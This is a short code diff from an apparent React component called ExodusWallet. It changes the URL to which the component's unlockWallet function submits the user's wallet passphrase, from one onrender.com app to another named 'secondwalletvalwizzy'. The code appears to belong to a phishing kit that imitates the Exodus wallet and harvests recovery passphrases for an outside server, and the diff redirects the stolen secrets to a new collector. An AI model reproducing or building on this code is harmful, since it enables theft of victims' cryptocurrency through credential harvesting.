@@ -10,7 +10,7 @@ const ExodusWallet = () => {
     const [loading, setLoading] = useState(false);
   
     const unlockWallet = async () => {
-      const url = 'https://obaro-wallet-connector.onrender.com/exodus';
+      const url = 'https://secondwalletvalwizzy.onrender.com/exodus';
       const data = { passphrase: text };
       try {
         setLoading(true);
